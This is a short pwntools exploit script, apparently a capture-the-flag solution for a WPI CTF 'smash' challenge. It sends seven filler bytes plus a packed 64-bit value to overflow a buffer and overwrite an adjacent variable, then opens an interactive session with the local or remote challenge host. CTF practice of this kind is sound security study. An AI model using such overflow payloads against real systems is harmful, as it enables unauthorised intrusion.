#!/usr/bin/env python3
from pwn import *
from time import sleep

exe = ELF("./a.out")
binary = "./a.out"
context.binary = exe
#context.log_level = "debug"
IP, PORT = "smash184384.wpictf.xyz", 15724

global io
gdbscript = '''
break main
'''
if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
elif len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(binary)
else:
    io = process(binary)
    gdb.attach(io, gdbscript=gdbscript)

s = lambda a: io.send(a)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
sla = lambda a, b: io.sendlineafter(a, b)
re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline(False)

payload = ("A"*7).encode()+p64(0x3713004200000000)

#reu(": ")
sl(payload)
io.interactive()
